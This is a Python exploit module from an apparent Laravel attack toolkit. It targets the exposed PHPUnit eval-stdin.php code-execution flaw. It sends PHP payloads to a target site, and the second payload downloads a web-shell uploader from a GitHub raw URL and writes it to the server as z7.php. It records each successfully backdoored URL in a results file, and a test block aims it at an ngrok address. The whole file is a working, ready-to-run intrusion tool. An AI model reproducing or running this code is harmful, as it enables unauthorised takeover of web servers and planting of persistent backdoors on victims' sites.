#!/usr/bin/python
# ------
# https://github.com/404rgr/Laravel_Exploit
# Disclaimer: https://pastebin.com/5BLNidpT
# ------
# Version 2.0
# Coder: Zeerx7
# -------------

import requests
from requests import post
from .color import *

class phpunit:
  def __init__(self):
    self.path  = '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
    self.data1 = '<?php echo "ToolsByZeerx7";?>'
    self.data2 = "<?php copy('https://raw.githubusercontent.com/404rgr/aset/master/Web-Shell/uploader.php','z7.php');readfile('z7.php'); ?>"
    self.timeout    = 15
    self.filename   = 'results/shell.txt'
    self.filemanual = 'results/manual.txt'
    self.headers    = {
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'
    }
  def exploit(self, url):
    try:
       url = url+self.path
       req = post(url, data=self.data1, headers=self.headers, timeout=self.timeout)
       if req.status_code == 200 and 'ToolsByZeerx7' in req.text:
         req = post(url, data=self.data2, headers=self.headers, timeout=self.timeout)
         if '#sess#ok#' in req.text:
             #uploader succes uploaded!
             shell = url.replace('eval-stdin.php', 'z7.php');
             with open(self.filename, 'a') as sv:
                 sv.write(shell+'\n')
             return True
         else:
             #uploader can't uploaded! maybe because permission, and must be done manually
             with open(self.filemanual, 'a') as sv:
                 sv.write(url+'\n')
             return True
       else:
         #not vuln!
         return False
    except requests.exceptions.ConnectionError:
      print('{}{} >> Error Connection'.format(red, url))
      return None
    except Exception as v:
      # print (v)
      return None

if __name__ == '__main__':
  # test
  url = 'http://9877-13-67-118-222.ngrok.io/'
  y = phpunit()
  print (y.exploit(url))
